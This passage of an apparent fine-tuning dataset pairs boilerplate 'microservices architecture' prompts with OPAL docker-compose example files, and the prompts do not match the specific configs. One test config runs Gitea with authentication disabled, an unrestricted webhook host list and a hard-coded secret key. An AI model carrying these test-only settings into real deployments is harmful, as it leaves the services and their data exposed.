docker-compose-app-tests.yml down -v\nrm -rf opal-tests-policy-repo temp-repo gitea-data git-repos .env\n```\n", "metadata": {"source": "github.com/permitio/opal", "file_path": "app-tests/README.md", "language": "markdown", "complexity": "simple", "star_count": 5318, "quality_score": 0.76, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 63}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "services:\n  # Minimal Gitea for testing - no authentication, stateless\n  gitea:\n    image: gitea/gitea:latest-rootless\n    container_name: gitea\n    environment:\n      - GITEA__server__DOMAIN=localhost\n      - GITEA__server__HTTP_PORT=3000\n      - GITEA__server__ROOT_URL=http://localhost:3000/\n      - GITEA__server__OFFLINE_MODE=true\n      # Security settings - disable all authentication\n      - GITEA__security__INSTALL_LOCK=true\n      - GITEA__security__SECRET_KEY=not-so-secret\n      - GITEA__security__INTERNAL_TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n      # Service settings - allow anonymous access\n      - GITEA__service__DISABLE_REGISTRATION=true\n      - GITEA__service__REQUIRE_SIGNIN_VIEW=false\n      - GITEA__service__ENABLE_NOTIFY_MAIL=false\n      - GITEA__service__ENABLE_CAPTCHA=false\n      - GITEA__service__DEFAULT_ALLOW_CREATE_ORGANIZATION=true\n      - GITEA__service__DEFAULT_ENABLE_DEPENDENCIES=false\n      # Repository settings\n      - GITEA__repository__ENABLE_PUSH_CREATE_USER=true\n      - GITEA__repository__ENABLE_PUSH_CREATE_ORG=true\n      - GITEA__repository__DEFAULT_BRANCH=main\n      - GITEA__repository__DEFAULT_PRIVATE=false\n      # Disable features we don't need\n      - GITEA__webhook__ALLOWED_HOST_LIST=*\n      - GITEA__migrations__ALLOWED_DOMAINS=*\n      - GITEA__federation__ENABLED=false\n      - GITEA__packages__ENABLED=false\n      - GITEA__actions__ENABLED=false\n      # Allow anonymous git operations\n      - GITEA__repository__ENABLE_PUSH_CREATE_USER=true\n      - GITEA__repository__ENABLE_PUSH_CREATE_ORG=true\n      - GITEA__repository__FORCE_PRIVATE=false\n      - GITEA__server__ENABLE_GZIP=false\n    ports:\n      - \"3000:3000\"\n      - \"2222:2222\"\n    networks:\n      - default\n\n  broadcast_channel:\n    image: postgres:alpine\n    environment:\n      - POSTGRES_DB=postgres\n      - POSTGRES_USER=postgres\n      - POSTGRES_PASSWORD=postgres\n\n  opal_server:\n    image: permitio/opal-server:${OPAL_IMAGE_TAG:-latest}\n    deploy:\n      mode: replicated\n      replicas: 2\n      endpoint_mode: vip\n    environment:\n      - OPAL_BROADCAST_URI=postgres://postgres:postgres@broadcast_channel:5432/postgres\n      - UVICORN_NUM_WORKERS=4\n      - OPAL_POLICY_REPO_URL=http://gitea:3000/gitea_admin/policy-repo.git\n      - OPAL_POLICY_REPO_MAIN_BRANCH=${POLICY_REPO_BRANCH:-main}\n      - OPAL_DATA_CONFIG_SOURCES={\"config\":{\"entries\":[{\"url\":\"http://opal_server:7002/policy-data\",\"config\":{\"headers\":{\"Authorization\":\"Bearer ${OPAL_CLIENT_TOKEN}\"}},\"topics\":[\"policy_data\"],\"dst_path\":\"/static\"}]}}\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n      - OPAL_POLICY_REPO_WEBHOOK_SECRET=xxxxx\n      - OPAL_POLICY_REPO_WEBHOOK_PARAMS={\"secret_header_name\":\"x-webhook-token\",\"secret_type\":\"token\",\"secret_parsing_regex\":\"(.*)\",\"event_request_key\":\"gitEvent\",\"push_event_value\":\"git.push\"}\n      - OPAL_AUTH_PUBLIC_KEY=${OPAL_AUTH_PUBLIC_KEY}\n      - OPAL_AUTH_PRIVATE_KEY=${OPAL_AUTH_PRIVATE_KEY}\n      - OPAL_AUTH_PRIVATE_KEY_PASSPHRASE=${OPAL_AUTH_PRIVATE_KEY_PASSPHRASE}\n      - OPAL_AUTH_MASTER_TOKEN=${OPAL_AUTH_MASTER_TOKEN}\n      - OPAL_AUTH_JWT_AUDIENCE=https://api.opal.ac/v1/\n      - OPAL_AUTH_JWT_ISSUER=https://opal.ac/\n      - OPAL_STATISTICS_ENABLED=true\n    ports:\n      - \"7002-7003:7002\"\n    depends_on:\n      - broadcast_channel\n      - gitea\n\n  opal_client:\n    image: permitio/opal-client:${OPAL_IMAGE_TAG:-latest}\n    deploy:\n      mode: replicated\n      replicas: 2\n      endpoint_mode: vip\n    environment:\n      - OPAL_SERVER_URL=http://opal_server:7002\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n      - OPAL_INLINE_OPA_LOG_FORMAT=http\n      - OPAL_SHOULD_REPORT_ON_DATA_UPDATES=True\n      - OPAL_DEFAULT_UPDATE_CALLBACKS={\"callbacks\":[[\"http://opal_server:7002/data/callback_report\",{\"method\":\"post\",\"process_data\":false,\"headers\":{\"Authorization\":\"Bearer ${OPAL_CLIENT_TOKEN}\",\"content-type\":\"application/json\"}}]]}\n      - OPAL_OPA_HEALTH_CHECK_POLICY_ENABLED=True\n      - OPAL_CLIENT_TOKEN=${OPAL_CLIENT_TOKEN}\n      - OPAL_AUTH_JWT_AUDIENCE=https://api.opal.ac/v1/\n      - OPAL_AUTH_JWT_ISSUER=https://opal.ac/\n      - OPAL_STATISTICS_ENABLED=true\n    ports:\n      - \"7766-7767:7000\"\n      - \"8181-8182:8181\"\n    depends_on:\n      - opal_server\n    command: sh -c \"exec ./wait-for.sh opal_server:7002 --timeout=20 -- ./start.sh\"\n", "metadata": {"source": "github.com/permitio/opal", "file_path": "app-tests/docker-compose-app-tests.yml", "language": "yaml", "complexity": "medium", "star_count": 5318, "quality_score": 0.76, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 102}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: opal-api-policy-source-example\n\nservices:\n  # When scaling the opal-server to multiple nodes and/or multiple workers, we use\n  # a *broadcast* channel to sync between all the instances of opal-server.\n  # Under the hood, this channel is implemented by encode/broadcaster (see link below).\n  # At the moment, the broadcast channel can be either: postgresdb, redis or kafka.\n  # The format of the broadcaster URI string (the one we pass to opal server as `OPAL_BROADCAST_URI`) is specified here:\n  # https://github.com/encode/broadcaster#available-backends\n  broadcast_channel:\n    image: postgres:alpine\n    environment:\n      - POSTGRES_DB=postgres\n      - POSTGRES_USER=postgres\n      - POSTGRES_PASSWORD=postgres\n\n  opal_server:\n    # by default we run opal-server from latest official image\n    image: permitio/opal-server:latest\n    environment:\n      # the broadcast backbone uri used by opal server workers (see comments above for: broadcast_channel)\n      - OPAL_BROADCAST_URI=postgres://postgres:postgres@broadcast_channel:5432/postgres\n      # number of uvicorn workers to run inside the opal-server container\n      - UVICORN_NUM_WORKERS=4\n      # the url of the Api bundle server hosting our policy\n      # - you can pass a token if you need to authentication via `POLICY_BUNDLE_SERVER_TOKEN`\n      # - in this example we use nginx server that serve static bundle.tar.gz files without token\n      # - our bundle server is compatible with OPA bundle server\n      # - for more info, see: https://www.openpolicyagent.org/docs/latest/management-bundles/\n      - OPAL_POLICY_BUNDLE_URL=http://api_policy_source_server\n      - OPAL_POLICY_SOURCE_TYPE=API\n      # - the base path for the local git in Opal server\n      - OPAL_POLICY_REPO_CLONE_PATH=~/opal\n      # in this example we will use a polling interval of 30 seconds to check for new policy updates (new bundle files).\n      # however, it is better to utilize a api *webhook* to trigger the server to check for changes only when the bundle server has new bundle.\n      # for more info see: https://docs.opal.ac/tutorials/track_an_api_bundle_server\n      - OPAL_POLICY_REPO_POLLING_INTERVAL=30\n      # configures from where the opal client should initially fetch data (when it first goes up, after disconnection, etc).\n      # the data sources represents from where the opal clients should get a \"complete picture\" of the data they need.\n      # after the initial sources are fetched, the client will subscribe only to update notifications sent by the server.\n      - OPAL_DATA_CONFIG_SOURCES={\"config\":{\"entries\":[{\"url\":\"http://opal_server:7002/policy-data\",\"topics\":[\"policy_data\"],\"dst_path\":\"/static\"}]}}\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n    ports:\n      # exposes opal server on the host machine, you can access the server at: http://localhost:7002\n      - \"7002:7002\"\n    depends_on:\n      - broadcast_channel\n\n  opal_client:\n    # by default we run opal-client from latest official image\n    image: permitio/opal-client:latest\n    environment:\n      - OPAL_SERVER_URL=http://opal_server:7002\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n      - OPAL_INLINE_OPA_LOG_FORMAT=http\n    ports:\n      # exposes opal client on the host machine, you can access the client at: http://localhost:7766\n      - \"7766:7000\"\n      # exposes the OPA agent (being run by OPAL) on the host machine\n      # you can access the OPA api that you know and love at: http://localhost:8181\n      # OPA api docs are at: https://www.openpolicyagent.org/docs/latest/rest-api/\n      - \"8181:8181\"\n    depends_on:\n      - opal_server\n    # this command is not necessary when deploying OPAL for real, it is simply a trick for dev environments\n    # to make sure that opal-server is already up before starting the client.\n    command: sh -c \"exec ./wait-for.sh opal_server:7002 --timeout=20 -- ./start.sh\"\n\n  # Demo bundle server to serve the policy\n  api_policy_source_server:\n    # we use nginx to serve the bundle files\n    image: nginx\n    # expose internal port 80 to localhost 8000\n    ports:\n      - 8000:80\n    # map files into the docker to edit nginx conf and put the bundle files into the container\n    volumes:\n      - ./docker_files/bundle_files:/usr/share/nginx/html\n      - ./docker_files/nginx.conf:/etc/nginx/nginx.conf\n", "metadata": {"source": "github.com/permitio/opal", "file_path": "docker/docker-compose-api-policy-source-example.yml", "language": "yaml", "complexity": "simple", "star_count": 5318, "quality_score": 0.76, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 80}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: opal-cedar-example\n\nservices:\n  # When scaling the opal-server to multiple nodes and/or multiple workers, we use\n  # a *broadcast* channel to sync between all the instances of opal-server.\n  # Under the hood, this channel is implemented by encode/broadcaster (see link below).\n  # At the moment, the broadcast channel can be either: postgresdb, redis or kafka.\n  # The format of the broadcaster URI string (the one we pass to opal server as `OPAL_BROADCAST_URI`) is specified here:\n  # https://github.com/encode/broadcaster#available-backends\n  broadcast_channel:\n    image: postgres:alpine\n    environment:\n      - POSTGRES_DB=postgres\n      - POSTGRES_USER=postgres\n      - POSTGRES_PASSWORD=postgres\n  cedar_data_nginx:\n    image: nginx:latest\n    volumes:\n      - \"./docker_files/cedar_data:/usr/share/nginx/html:ro\"\n  opal_server:\n    # by default we run opal-server from latest official image\n    image: permitio/opal-server:latest\n    environment:\n      # the broadcast backbone uri used by opal server workers (see comments above for: broadcast_channel)\n      - OPAL_BROADCAST_URI=postgres://postgres:postgres@broadcast_channel:5432/postgres\n      # number of uvicorn workers to run inside the opal-server container\n      - UVICORN_NUM_WORKERS=4\n      # the git repo hosting our policy\n      # - if this repo is not public, you can pass an ssh key via `OPAL_POLICY_REPO_SSH_KEY`)\n      # - the repo we pass in this example is *public* and acts as an example repo with dummy rego policy\n      # - for more info, see: https://docs.opal.ac/tutorials/track_a_git_repo\n      - OPAL_POLICY_REPO_URL=https://github.com/permitio/opal-example-policy-repo.git\n      # in this example we will use a polling interval of 30 seconds to check for new policy updates (git commits affecting the rego policy).\n      # however, it is better to utilize a git *webhook* to trigger the server to check for changes only when the repo has new commits.\n      # for more info see: https://docs.opal.ac/tutorials/track_a_git_repo\n      - OPAL_POLICY_REPO_POLLING_INTERVAL=30\n      # configures from where the opal client should initially fetch data (when it first goes up, after disconnection, etc).\n      # the data sources represents from where the opal clients should get a \"complete picture\" of the data they need.\n      # after the initial sources are fetched, the client will subscribe only to update notifications sent by the server.\n      - OPAL_DATA_CONFIG_SOURCES={\"config\":{\"entries\":[{\"url\":\"http://cedar_data_nginx/data.json\",\"topics\":[\"policy_data\"],\"dst_path\":\"\"}]}}\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n\n      # By default, the OPAL server looks for OPA rego files. Configure it to look for cedar files.\n      - OPAL_FILTER_FILE_EXTENSIONS=.cedar\n      - OPAL_POLICY_REPO_POLICY_EXTENSIONS=.cedar\n    ports:\n      # exposes opal server on the host machine, you can access the server at: http://localhost:7002\n      - \"7002:7002\"\n    depends_on:\n      - broadcast_channel\n  opal_client:\n    # by default we run opal-client from latest official image\n    image: permitio/opal-client-cedar:latest\n    environment:\n      - OPAL_SERVER_URL=http://opal_server:7002\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n\n      # Uncomment the following lines to enable storing & loading OPA data from a backup file:\n      # - OPAL_OFFLINE_MODE_ENABLED=true\n    # volumes:\n    #  - opa_backup:/opal/backup:rw\n\n    ports:\n      # exposes opal client on the host machine, you can access the client at: http://localhost:7000\n      - \"7766:7000\"\n      # exposes the OPA agent (being run by OPAL) on the host machine\n      # you can access the OPA api that you know and love at: http://localhost:8181\n      # OPA api docs are at: https://www.openpolicyagent.org/docs/latest/rest-api/\n      - \"8180:8180\"\n    depends_on:\n      - opal_server\n    # this command is not necessary when deploying OPAL for real, it is simply a trick for dev environments\n    # to make sure that opal-server is already up before starting the client.\n    command: sh -c \"exec ./wait-for.sh opal_server:7002 --timeout=20 -- ./start.sh\"\n    links:\n      - cedar_data_nginx\n\nvolumes:\n  opa_backup:\n", "metadata": {"source": "github.com/permitio/opal", "file_path": "docker/docker-compose-example-cedar.yml", "language": "yaml", "complexity": "simple", "star_count": 5318, "quality_score": 0.76, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 80}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: opal-example\n\nservices:\n  # When scaling the opal-server to multiple nodes and/or multiple workers, we use\n  # a *broadcast* channel to sync between all the instances of opal-server.\n  # Under the hood, this channel is implemented by encode/broadcaster (see link below).\n  # At the moment, the broadcast channel can be either: postgresdb, redis or kafka.\n  # The format of the broadcaster URI string (the one we pass to opal server as `OPAL_BROADCAST_URI`) is specified here:\n  # https://github.com/encode/broadcaster#available-backends\n  broadcast_channel:\n    image: postgres:alpine\n    environment:\n      - POSTGRES_DB=postgres\n      - POSTGRES_USER=postgres\n      - POSTGRES_PASSWORD=postgres\n  opal_server:\n    # by default we run opal-server from latest official image\n    image: permitio/opal-server:latest\n    environment:\n      # the broadcast backbone uri used by opal server workers (see comments above for: broadcast_channel)\n      - OPAL_BROADCAST_URI=postgres://postgres:postgres@broadcast_channel:5432/postgres\n      # number of uvicorn workers to run inside the opal-server container\n      - UVICORN_NUM_WORKERS=4\n      # the git repo hosting our policy\n      # - if this repo is not public, you can pass an ssh key via `OPAL_POLICY_REPO_SSH_KEY`)\n      # - the repo we pass in this example is *public* and acts as an example repo with dummy rego policy\n      # - for more info, see: https://docs.opal.ac/tutorials/track_a_git_repo\n      - OPAL_POLICY_REPO_URL=https://github.com/permitio/opal-example-policy-repo\n      # in this example we will use a polling interval of 30 seconds to check for new policy updates (git commits affecting the rego policy).\n      # however, it is better to utilize a git *webhook* to trigger the server to check for changes only when the repo has new commits.\n      # for more info see: https://docs.opal.ac/tutorials/track_a_git_repo\n      - OPAL_POLICY_REPO_POLLING_INTERVAL=30\n      # configures from where the opal client should initially fetch data (when it first goes up, after disconnection, etc).\n      # the data sources represents from where the opal clients should get a \"complete picture\" of the data they need.\n      # after the initial sources are fetched, the client will subscribe only to update notifications sent by the server.\n      - OPAL_DATA_CONFIG_SOURCES={\"config\":{\"entries\":[{\"url\":\"http://opal_server:7002/policy-data\",\"topics\":[\"policy_data\"],\"dst_path\":\"/static\"}]}}\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n    ports:\n      # exposes opal server on the host machine, you can access the server at: http://localhost:7002\n      - \"7002:7002\"\n    depends_on:\n      - broadcast_channel\n  opal_client:\n    # by default we run opal-client from latest official image\n    image: permitio/opal-client:latest\n    environment:\n      - OPAL_SERVER_URL=http://opal_server:7002\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n      - OPAL_INLINE_OPA_LOG_FORMAT=http\n\n      # Uncomment the following lines to enable storing & loading OPA data from a backup file:\n      # - OPAL_OFFLINE_MODE_ENABLED=true\n    # volumes:\n    #  - opa_backup:/opal/backup:rw\n\n    ports:\n      # exposes opal client on the host machine, you can access the client at: http://localhost:7766\n      - \"7766:7000\"\n      # exposes the OPA agent (being run by OPAL) on the host machine\n      # you can access the OPA api that you know and love at: http://localhost:8181\n      # OPA api docs are at: https://www.openpolicyagent.org/docs/latest/rest-api/\n      - \"8181:8181\"\n    depends_on:\n      - opal_server\n    # this command is not necessary when deploying OPAL for real, it is simply a trick for dev environments\n    # to make sure that opal-server is already up before starting the client.\n    command: sh -c \"exec ./wait-for.sh opal_server:7002 --timeout=20 -- ./start.sh\"\n\nvolumes:\n  opa_backup:\n", "metadata": {"source": "github.com/permitio/opal", "file_path": "docker/docker-compose-example.yml", "language": "yaml", "complexity": "simple", "star_count": 5318, "quality_score": 0.76, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 71}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: opal-git-webhook-example\n\nservices:\n  # When scaling the opal-server to multiple nodes and/or multiple workers, we use\n  # a *broadcast* channel to sync between all the instances of opal-server.\n  # Under the hood, this channel is implemented by encode/broadcaster (see link below).\n  # At the moment, the broadcast channel can be either: postgresdb, redis or kafka.\n  # The format of the broadcaster URI string (the one we pass to opal server as `OPAL_BROADCAST_URI`) is specified here:\n  # https://github.com/encode/broadcaster#available-backends\n  broadcast_channel:\n    image: postgres:alpine\n    environment:\n      - POSTGRES_DB=postgres\n      - POSTGRES_USER=postgres\n      - POSTGRES_PASSWORD=postgres\n  opal_server:\n    # by default we run opal-server from latest official image\n    image: permitio/opal-server:latest\n    environment:\n      # the broadcast backbone uri used by opal server workers (see comments above for: broadcast_channel)\n      - OPAL_BROADCAST_URI=postgres://postgres:postgres@broadcast_channel:5432/postgres\n      # number of uvicorn workers to run inside the opal-server container\n      - UVICORN_NUM_WORKERS=4\n      # the git repo hosting our policy\n      # - if this repo is not public, you can pass an ssh key via `OPAL_POLICY_REPO_SSH_KEY`)\n      # - the repo we pass in this example is *public* and acts as an example repo with dummy rego policy\n      # - for more info, see: https://docs.opal.ac/tutorials/track_a_git_repo\n      - OPAL_POLICY_REPO_URL=https://github.com/permitio/opal-example-policy-repo\n      # configures from where the opal client should initially fetch data (when it first goes up, after disconnection, etc).\n      # the data sources represents from where the opal clients should get a \"complete picture\" of the data they need.\n      # after the initial sources are fetched, the client will subscribe only to update notifications sent by the server.\n      - OPAL_DATA_CONFIG_SOURCES={\"config\":{\"entries\":[{\"url\":\"http://opal_server:7002/policy-data\",\"topics\":[\"policy_data\"],\"dst_path\":\"/static\"}]}}\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n      #\n      # Webhook configuration\n      # - To simulate webhook, run the following command:\n      #   curl --request POST 'http://localhost:7002/webhook' --header 'Content-Type: application/json' --header 'x-webhook-token: xxxxx' --data-raw '{\"gitEvent\":\"git.push\",\"repository\":{\"git_url\":\"https://github.com/permitio/opal-example-policy-repo\"}}'\n      - OPAL_POLICY_REPO_WEBHOOK_SECRET=xxxxx\n      - OPAL_POLICY_REPO_WEBHOOK_PARAMS={\"secret_header_name\":\"x-webhook-token\",\"secret_type\":\"token\",\"secret_parsing_regex\":\"(.*)\",\"event_request_key\":\"gitEvent\",\"push_event_value\":\"git.push\"}\n    ports:\n      # exposes opal server on the host machine, you can access the server at: http://localhost:7002\n      - \"7002:7002\"\n    depends_on:\n      - broadcast_channel\n  opal_client:\n    # by default we run opal-client from latest official image\n    image: permitio/opal-client:latest\n    environment:\n      - OPAL_SERVER_URL=http://opal_server:7002\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n      - OPAL_INLINE_OPA_LOG_FORMAT=http\n    ports:\n      # exposes opal client on the host machine, you can access the client at: http://localhost:7766\n      - \"7766:7000\"\n      # exposes the OPA agent (being run by OPAL) on the host machine\n      # you can access the OPA api that you know and love at: http://localhost:8181\n      # OPA api docs are at: https://www.openpolicyagent.org/docs/latest/rest-api/\n      - \"8181:8181\"\n    depends_on:\n      - opal_server\n    # this command is not necessary when deploying OPAL for real, it is simply a trick for dev environments\n    # to make sure that opal-server is already up before starting the client.\n    command: sh -c \"exec ./wait-for.sh opal_server:7002 --timeout=20 -- ./start.sh\"\n", "metadata": {"source": "github.com/permitio/opal", "file_path": "docker/docker-compose-git-webhook.yml", "language": "yaml", "complexity": "simple", "star_count": 5318, "quality_score": 0.76, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 64}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: opal-scopes-example\n\nservices:\n  redis:\n    image: redis\n    ports:\n      - \"6379:6379\"\n\n  opal_server:\n    # by default we run opal-server from latest official image\n    image: permitio/opal-server:latest\n    environment:\n      # the broadcast backbone uri used by opal server workers (see comments above for: broadcast_channel)\n      - OPAL_BROADCAST_URI=redis://redis:6379\n      # number of uvicorn workers to run inside the opal-server container\n      - UVICORN_NUM_WORKERS=4\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n      # using scopes requires having a running redis instance\n      - OPAL_REDIS_URL=redis://redis:6379\n      - OPAL_SCOPES=1\n      - OPAL_POLICY_REFRESH_INTERVAL=30\n      - OPAL_BASE_DIR=/opal\n    ports:\n      # exposes opal server on the host machine, you can access the server at: http://localhost:7002\n      - \"7002:7002\"\n    depends_on:\n      - redis\n\n  my_opal_client:\n    # by default we run opal-client from latest official image\n    image: permitio/opal-client:latest\n    environment:\n      - OPAL_SERVER_URL=http://opal_server:7002\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n      - OPAL_INLINE_OPA_LOG_FORMAT=http\n      - OPAL_SCOPE_ID=myscope\n    ports:\n      # exposes opal client on the host machine, you can access the client at: http://localhost:7766\n      - \"7766:7000\"\n      # exposes the OPA agent (being run by OPAL) on the host machine\n      # you can access the OPA api that you know and love at: http://localhost:8181\n      # OPA api docs are at: https://www.openpolicyagent.org/docs/latest/rest-api/\n      - \"8181:8181\"\n    depends_on:\n      - opal_server\n    # this command is not necessary when deploying OPAL for real, it is simply a trick for dev environments\n    # to make sure that opal-server is already up before starting the client.\n    command: sh -c \"exec ./wait-for.sh opal_server:7002 --timeout=20 -- ./start.sh\"\n\n  her_opal_client:\n    image: permitio/opal-client:latest\n    environment:\n      - OPAL_SERVER_URL=http://opal_server:7002\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n      - OPAL_INLINE_OPA_LOG_FORMAT=http\n      - OPAL_SCOPE_ID=herscope\n    ports:\n      - \"7767:7000\"\n      - \"8182:8181\"\n    depends_on:\n      - opal_server\n    command: sh -c \"exec ./wait-for.sh opal_server:7002 --timeout=20 -- ./start.sh\"\n", "metadata": {"source": "github.com/permitio/opal", "file_path": "docker/docker-compose-scopes-example.yml", "language": "yaml", "complexity": "simple", "star_count": 5318, "quality_score": 0.73, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 63}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: opal-single-topic-multi-tenant-example\n\nservices:\n  # When scaling the opal-server to multiple nodes and/or multiple workers, we use\n  # a *broadcast* channel to sync between all the instances of opal-server.\n  # Under the hood, this channel is implemented by encode/broadcaster (see link below).\n  # At the moment, the broadcast channel can be either: postgresdb, redis or kafka.\n  # The format of the broadcaster URI string (the one we pass to opal server as `OPAL_BROADCAST_URI`) is specified here:\n  # https://github.com/encode/broadcaster#available-backends\n  broadcast_channel:\n    image: postgres:alpine\n    environment:\n      - POSTGRES_DB=postgres\n      - POSTGRES_USER=postgres\n      - POSTGRES_PASSWORD=postgres\n\n  # OPAL Server - manages policy and data distribution\n  # This example demonstrates the revolutionary single-topic approach for multi-tenancy\n  # that eliminates the need for system restarts when adding new tenants\n  opal_server:\n    # by default we run opal-server from latest official image\n    image: permitio/opal-server:latest\n    environment:\n      # the broadcast backbone uri used by opal server workers (see comments above for: broadcast_channel)\n      - OPAL_BROADCAST_URI=postgres://postgres:postgres@broadcast_channel:5432/postgres\n      # number of uvicorn workers to run inside the opal-server container\n      - UVICORN_NUM_WORKERS=4\n\n      # Policy repository configuration - using GitHub for reliable policy sync\n      # This is the RECOMMENDED approach for OPAL demonstrations as it ensures:\n      # - Reliable policy loading and sync mechanism\n      # - Real-time policy updates via OPAL's designed workflow\n      # - Consistent behavior across different environments\n      # The repo demonstrates single-topic multi-tenant approach\n      - OPAL_POLICY_REPO_URL=https://github.com/permitio/opal-example-policy-repo\n      - OPAL_POLICY_REPO_MAIN_BRANCH=master\n      # Polling interval for policy updates (30 seconds for demo, use webhooks in production)\n      - OPAL_POLICY_REPO_POLLING_INTERVAL=30\n      - OPAL_POLICY_REPO_SSH_KEY=\"\"\n      - OPAL_POLICY_SUBSCRIPTION_DIRS=single-topic-multi-tenant\n\n      # Data sources configuration - using single topic approach\n      # Initially empty - tenants will be added dynamically via API\n      # This is the KEY to our revolutionary approach: one topic handles all tenants\n      - 'OPAL_DATA_CONFIG_SOURCES={\"config\": {\"entries\": []}}'\n\n      # Server configuration\n      - OPAL_LOG_LEVEL=INFO\n      - OPAL_SERVER_URL=http://opal_server:7002\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n    # Note: No volume mount needed - policies are loaded from GitHub repo\n    # OPAL will clone the repo and sync policies automatically\n    ports:\n      # exposes opal server on the host machine, you can access the server at: http://localhost:7002\n      - \"7002:7002\"\n    depends_on:\n      - broadcast_channel\n\n  # OPAL Client - fetches policies and data, manages OPA\n  # Configured with REVOLUTIONARY SINGLE TOPIC approach\n  opal_client:\n    # by default we run opal-client from latest official image\n    image: permitio/opal-client:latest\n    environment:\n      # Server connection\n      - OPAL_SERVER_URL=http://opal_server:7002\n      - OPAL_LOG_FORMAT_INCLUDE_PID=true\n      - OPAL_INLINE_OPA_LOG_FORMAT=http\n\n      # OPA configuration with v0 compatibility for old rego syntax\n      # Using inline OPA instead of external opa container\n      - OPAL_POLICY_STORE_URL=http://localhost:8181\n      - 'OPAL_INLINE_OPA_CONFIG={\"v0_compatible\": true}'\n\n      # Policy subscription configuration\n      - OPAL_POLICY_SUBSCRIPTION_DIRS=single-topic-multi-tenant\n\n      # REVOLUTIONARY SINGLE TOPIC CONFIGURATION\n      # Traditional approach: OPAL_DATA_TOPICS=tenant_1_data,tenant_2_data,tenant_3_data (requires restart)\n      # Our breakthrough: OPAL_DATA_TOPICS=tenant_data (NO restart needed!)\n      # The key insight: one topic + multiple dynamic data sources = infinite scalability\n      - OPAL_DATA_UPDATER_ENABLED=true\n      - OPAL_DATA_TOPICS=tenant_data\n\n      # Data fetcher configuration\n      - OPAL_FETCH_WORKER_POOLS=1\n      - OPAL_FETCH_TIMEOUT=30\n\n      # Logging configuration\n      - OPAL_LOG_LEVEL=DEBUG\n    extra_hosts:\n      - 